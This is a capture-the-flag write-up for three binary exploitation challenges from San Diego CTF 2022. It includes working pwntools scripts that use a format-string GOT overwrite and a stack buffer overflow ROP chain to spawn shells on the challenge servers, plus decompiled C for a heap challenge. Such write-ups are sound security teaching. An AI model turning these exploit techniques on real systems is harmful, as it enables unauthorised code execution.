---
title: San Diego CTF 2022
date: 2022-05-10T10:42:24.647Z
draft: false
featured: false
image:
  filename: featured
  focal_point: Smart
  preview_only: false
---
- - -

> # San Diego CTF 2022 pwn writeups

- - -

> CTF : <https://ctftime.org/event/1356>
>
> I played this CTF with **[Project Sekai](https://ctftime.org/team/169557)** and it was really great. We came 5th in the CTF.

![](https://i.imgur.com/7Uwtq3R.png)

- - -

> # Oil Spill

- - -

> **Description** : Darn, these oil spills are going crazy nowadays. It looks like there's a little bit more than oil coming out of this program though...
> **Challenge File** : [](https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill)[binary](https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill)
> **Docker File** : [Dockerfile](https://cdn.discordapp.com/attachments/808487148332122144/972245690707214346/Dockerfile)
> **Solves** : 73
> **Points** : 200
>
> # Checksec

- - -

```yaml
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
```

> # Overview

- - -

![](https://i.imgur.com/ZLcnejq.png)

The main function leaks the address of `puts`, `printf`, `our_input`, and `temp`. So we have libc address leak, stack leak which isn't required and PIE leak which is not required as well. 
The `temp` is just a useless function which is never called in the binary. 

The main function takes 300 bytes from stdin and  stores it in our_input. And then it is being printed back to the stdout using `printf` without any format specifiers on our_input. So we have a **format string bug** here. We control the first parameter to the `printf` function so we can use it to leak arbitrary data using `%p`, `%s`, `%x` and so many. And we can also write arbitrary data to memory using the `%n` specifier.  We can use that for our advantage. 

At the end the main function gives a calls to `puts` with `x` as the argument. `x` is a global variable in the bss segment. So it is both readable and writable. 

![](https://i.imgur.com/xMwBnvr.png)

![](https://i.imgur.com/3LLohQZ.png)

As per the docs the `xinfo` command 

```
Shows offsets of the specified address to useful other locations
```

> # Exploit

- - -

* First use the leaks from the main function to determine the libc base address.
* Since the binary uses <span style="color:green">Partial Relro</span>.
  use the fmt bug to overwrite the got of `puts` function to `system` address and at the same time overwrite the `x` global variable to "/bin/sh". 
* Get shell

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./OilSpill')
host = args.HOST or 'oil.sdc.tf'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

leaks=GetInt(rl())
libc.address = leaks[0]-libc.sym.puts
re()
payload = fmtstr_payload(8, {exe.got.puts : libc.sym.system, 0x600c80 : b"/bin/sh\x00"}, write_size='short')
lb()
pause()
sl(payload)

io.interactive()
```

- - -

> # Horoscope

- - -

> **Description** : This program will predict your future!
> **Challenge File** : [](https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill)[binary](https://cdn.discordapp.com/attachments/808487148332122144/972246124742180924/horoscope)
> **Solves** : 125
> **Points** : 100
>
> # Checksec

- - -

```yaml
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

> # Overview

- - -

![](https://i.imgur.com/lRAqXfM.png)

The main function takes an input of 320 bytes from stdin to `our_input`. `our_input` is a character array of 48 bytes. So the bug here is buffer overflow. 

And then our input is passed as an parameter to `processInput` function. 

![](https://i.imgur.com/4ugL9pr.png)

So we have to pass default case and return from the function to trigger the buffer overflow vulnerability and hijack the RIP. We can easily do this by prepending `1/1/1/1/` before the padding. Lets check some other functions in the binary.

There is a `test` and a `debug` function in the binary which are never called.

![](https://i.imgur.com/OvHja3m.png)

![](https://i.imgur.com/Z5WIokP.png)

Here the `temp` is just a global variable and it is initially 0 when the binary is running. We can set it to 1 by calling the `debug` function and then call the `test` function in our rop chain to execute `system("/bin/sh");` 

> # Exploit

- - -

* Begin the payload with `1/1/1/1/` to return from the `processInput` function.
* 48 bytes of padding to overflow the stack and reach RIP.
* call the `test` function to set `temp` variable to 1.
* call the debug function to execute `system("/bin/sh");`
* Get shell.

  ```python
  #!/usr/bin/python3
  # -*- coding: utf-8 -*-
  # Author := 4n0nym4u5

  from rootkit import *
  from time import sleep

  exe  = context.binary = ELF('./horoscope')
  host = args.HOST or 'horoscope.sdc.tf'
  port = int(args.PORT or 1337)

  gdbscript = '''
  tbreak main
  continue
  '''.format(**locals())

  libc=SetupLibcELF()
  io = start()

  padding = b"1/1/1/1/" + b"A"*48 + p(exe.sym.debug) + p(exe.sym.test)

  re()
  sl(padding)

  io.interactive()
  ```

  - - -

  > # Breakfast-Menu

  - - -

  > **Description** : I’m awfully hungry, with all these options to choose from, what should I order?
  > **Challenge File** : [](https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill)[binary](https://cdn.discordapp.com/attachments/808487148332122144/972248049038544926/BreakfastMenu)
  > **Docker File** : [](https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill)[binary](https://cdn.discordapp.com/attachments/808487148332122144/972248478430404608/Dockerfile)
  > **Solves** : 32
  > **Points** : 250
  >
  > # Checksec

  - - -

  ```yaml
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
  ```

  > # Overview

  - - -

  ```c
  int __cdecl __noreturn main(int argc,
      const char ** argv,
          const char ** envp) {
      int OPTION; // [rsp+10h] [rbp-10h] BYREF
      int GLOBAL_IDX; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v5; // [rsp+18h] [rbp-8h]

      v5 = __readfsqword(0x28 u);
      puts("Welcome to the SDCTF cafe!\n");
      puts(
          "This restaurant works a little different than normal ones. First, tell us if you want to make a new order, then you "
          "can change or delete orders.\n");
      fflush(_bss_start);
      GLOBAL_IDX = 0;
      while (1) {
          puts("1. Create a new order\n2. Edit an order\n3. Delete an order\n4. Pay your bill and leave");
          fflush(_bss_start);
          memset(buf, 0, sizeof(buf));
          __isoc99_scanf("%d", & OPTION);
          getchar();
          if (OPTION == 2) {
              puts("which order would you like to modify");
              fflush(_bss_start);
              __isoc99_scanf("%d", & OPTION);
              getchar();
              if (GLOBAL_IDX <= OPTION)
                  goto INVALID;
              puts("We have eggs, cereal, waffles and french toast. \nWhat would you like to order?");
              fflush(_bss_start);
              if (fgets(buf, 64, stdin)) {
                  printf("so you wanted %s", buf);
                  fflush(_bss_start);
              }
              strcpy(orders[OPTION], buf);
          } else if (OPTION > 2) {
              if (OPTION != 3) {
                  if (OPTION == 4) {
                      puts("thanks for coming!");
                      fflush(_bss_start);
                      exit(0);
                  }
                  LABEL_21:
                      exit(0);
              }
              puts("which order would you like to remove");
              fflush(_bss_start);
              __isoc99_scanf("%d", & OPTION);
              getchar();
              if (GLOBAL_IDX <= OPTION) {
                  INVALID: puts("Order doesn't exist!!!");
                  fflush(_bss_start);
              }
              else {
                  free(orders[OPTION]);
              }
          } else {
              if (OPTION != 1)
                  goto LABEL_21;
              if (GLOBAL_IDX <= 15) {
                  orders[GLOBAL_IDX++] = malloc(40 uLL);
                  puts("A new order has been created");
              } else {
                  puts("Too many orders, you can't be making any more!!!");
              }
              fflush(_bss_start);
          }
      }
  }
  ```